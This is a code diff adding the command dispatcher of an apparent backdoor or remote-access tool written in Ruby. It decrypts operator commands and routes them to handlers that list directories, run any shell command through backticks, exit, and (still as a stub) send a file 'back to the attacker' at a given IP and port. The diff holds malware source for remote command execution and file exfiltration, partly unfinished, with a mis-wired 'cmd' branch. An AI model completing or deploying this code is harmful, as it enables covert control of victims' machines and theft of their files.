@@ -10,8 +10,23 @@ require "openssl"
 
 class Dispatch
 
-	def initialize()
+	def initialize(ciphertext)
+		plaintext = decrypt ciphertext
 
+		# Split up the request so we can pass the parameters to the correct method
+		request = plaintext.split
+
+		case request[0].downcase
+		when "ls"
+			ls request[1]
+		when "get"
+			return get request[1], request[2], request[3]
+		when "die"
+			die
+		when "cmd"
+			cmd request[1]
+			"Unknown command."
+		end
 	end
 
 # -------------------------------------------------------------
@@ -23,15 +38,24 @@ class Dispatch
 	# List the contents of the current directory, or a given 
 	# directory path.
 	
-	def ls(path)
-	
+	def ls(path = "")
+		cmd 'ls ' + path
 	end
 
 	# Get
 	# 
-	# Send a file back to the attacker on the specified port
-	def get(path, port)
-		
+	# Send a file back to the attacker on a specified port
+
+	def get(path, ip, port)
+		# Make sure the file exists
+		if ! File.file? path
+			return "Sorry, that file does not exist."
+		else
+			# Create TCP connection to ip:port
+
+			# Begin passing file to client
+
+		end
 	end
 
 	# Die
@@ -39,7 +63,8 @@ class Dispatch
 	# Shut the program down.
 
 	def die()
-		
+		#TODO any necessary clean up?
+		exit
 	end
 
 	# Cmd
@@ -47,7 +72,7 @@ class Dispatch
 	# Run any command and send the result to the attacker.
 
 	def cmd(command)
-		
+		`#{command}`
 	end
 
 # -------------------------------------------------------------
